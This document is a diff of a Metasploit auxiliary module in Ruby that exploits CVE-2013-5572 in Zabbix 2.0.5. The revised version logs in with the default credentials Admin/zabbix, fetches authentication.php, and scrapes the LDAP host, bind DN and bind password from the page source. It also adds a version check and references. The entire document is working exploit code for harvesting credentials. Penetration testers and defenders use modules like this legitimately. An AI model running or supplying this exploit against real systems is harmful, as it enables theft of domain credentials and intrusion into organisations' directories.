@@ -1,86 +1,126 @@
-##
-# This module requires Metasploit
-# Date: 25-09-2013
-# Author: Pablo González
-# Vendor Homepage: Zabbix -> http://www.zabbix.com 
-# Software Link: http://www.zabbix.com 
-# Version: 2.0.5
-# Tested On: Linux (Ubuntu, Suse, CentOS)
-# CVE: CVE-2013-5572 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5572
-# More Info: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5572
-# 	   http://www.elladodelmal.com/2014/12/como-crear-el-modulo-metasploit-para-el.html
-# 	   http://seclists.org/fulldisclosure/2013/Sep/151
-#   	   http://www.cvedetails.com/cve/CVE-2013-5572/
-##
-
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'ldap_bind_password Zabbix CVE-2013-5572',
+      'Name'           => 'Zabbix LDAP Password Extractor',
       'Description'    => %q{
-          Zabbix 2.0.5 allows remote authenticated users to discover the LDAP bind password by leveraging management-console access and reading the ldap_bind_password value in the HTML source code.
+          Zabbix 2.0.5 allows remote authenticated users to discover the LDAP bind password by leveraging management-console access
+          and reading the ldap_bind_password value in the HTML source code.
       },
       'License'        => MSF_LICENSE,
-      'Author'         => [ '@pablogonzalezpe, Pablo Gonzalez' ]
+      'Author'         => [
+                           'Pablo Gonzalez', # @pablogonzalezpe, module author
+                           'h00die' # cleanup and submission
+                          ],
+      'Reference'      =>
+        [
+          ['CVE', '2013-5572'],
+          ['URL', 'http://www.elladodelmal.com/2014/12/como-crear-el-modulo-metasploit-para-el.html']
+        ],
+      'DisclosureDate' => 'Sep 30 2013'
     ))
 
     register_options([
-      OptString.new('zbx_session', [true, 'Cookie zbx_sessionid']),
-	  OptString.new('TARGETURI', [true, 'Path Zabbix Authentication','/zabbix/authentication.php']),
-	  OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5])
+      OptString.new('ZABBIXUSER',     [true, 'Username for Zabbix', 'Admin']),
+      OptString.new('ZABBIXPASSWORD', [true, 'Password for Zabbix', 'zabbix']),
+      OptString.new('TARGETURI',      [true, 'Path Zabbix Authentication', '/zabbix/'])
     ], self.class)
+  end
 
+  def check
+    vprint_status('start of check')
+    res = send_request_cgi(
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path, 'index.php')
+      )
+    vprint_status("#{res}")
+    if res && res.body && res.body.to_s =~ /Zabbix 2\.0\.5/
+      return Exploit::CheckCode::Appears
+    end
+    Exploit::CheckCode::Unknown
   end
 
   def run
-    req
-  end
-  def req
-	resp = send_request_cgi(
-      {
-		'host' => datastore['RHOST'],
+    cookie = login()
+    if cookie
+      res = send_request_cgi({
+        #'host' => datastore['RHOST'],
         'method' => 'POST',
-        'uri' => normalize_uri(target_uri.path.to_s),
-        'cookie' => "zbx_sessionid=#{datastore['zbx_session']}",
-		'content-type' => 'application/x-www-form-urlencoded'
-      }, datastore['TIMEOUT'])
-	    
-	  ldap_host(resp)
-	  user_passDomain(resp)
-	  user_zabbix(resp)
+        'uri' => normalize_uri(target_uri.path, 'authentication.php'),
+        'cookie' => cookie,
+        'Content-Type' => 'application/x-www-form-urlencoded'
+        })
+      if res && res.code && res.code == 200
+        ldap_host(res)
+        user_pass_domain(res)
+        user_zabbix(res)
+      else
+        print_error('Request for vulnerable page failed.')
+      end
+    end
   end
-  
+
+  def login
+    vprint_status("Attempting Login: #{datastore['ZABBIXUSER']}:#{datastore['ZABBIXPASSWORD']}")
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'index.php'),
+      'Content-Type' => 'application/x-www-form-urlencoded',
+      'method'       => 'POST',
+      'vars_post'    => {
+        'request'    => '',
+        'name'       => datastore['ZABBIXUSER'],
+        'password'   => datastore['ZABBIXPASSWORD'],
+        'enter'      => 'Sign in'
+      }
+    )
+    if res && res.redirect? #302
+      vprint_status('Login Success')
+      cookie = res.get_cookies
+      return cookie
+    else
+      print_bad('Login Failure')
+      nil
+    end
+  end
+
   def ldap_host(response)
-	cut = response.body.split("ldap_host\" value=\"")[1]
-	if cut != nil
-		host = cut.split("\"")[0]
-		print_good "LDAP Host => #{host}"
-	end
+    cut = response.body.split("ldap_host\" value=\"")[1]
+    if cut != nil
+      host = cut.split("\"")[0]
+      print_good("LDAP Host: #{host}")
+    else
+      print_status('No LDAP Host Found')
+    end
   end
-  
-  def user_passDomain(response)
-	cut = response.body.split("ldap_bind_dn\" value=\"")[1]
-	if cut != nil	
-		user = cut.split("\"")[0]
-		print_good "User Domain? => #{user}"
-	end
-	cut = response.body.split("name=\"ldap_bind_password\" value=\"")[1]
-	if cut != nil
-		pass = cut.split("\"")[0]
-		print_good "Password Domain? => #{pass}"
-	end
+
+  def user_pass_domain(response)
+    cut = response.body.split("ldap_bind_dn\" value=\"")[1]
+    if cut != nil
+      user = cut.split("\"")[0]
+      print_good("LDAP Bind Domain: #{user}")
+    else
+      print_status('No LDAP Bind Domain Found')
+    end
+    cut = response.body.split("name=\"ldap_bind_password\" value=\"")[1]
+    if cut != nil
+      pass = cut.split("\"")[0]
+      print_good("LDAP Bind Password: #{pass}")
+    else
+      print_status('No LDAP Bind Password Found')
+    end
   end
 
   def user_zabbix(response)
-	cut = response.body.split("user\" value=\"")[1]
-	if cut != nil
-		user = cut.split("\"")[0]
-		print_good "User Zabbix => #{user}"
-	end
+    cut = response.body.split("user\" value=\"")[1]
+    if cut != nil
+      user = cut.split("\"")[0]
+      print_good("Login (user): #{user}")
+    else
+      print_status('No Login (user) found')
+    end
   end
 end
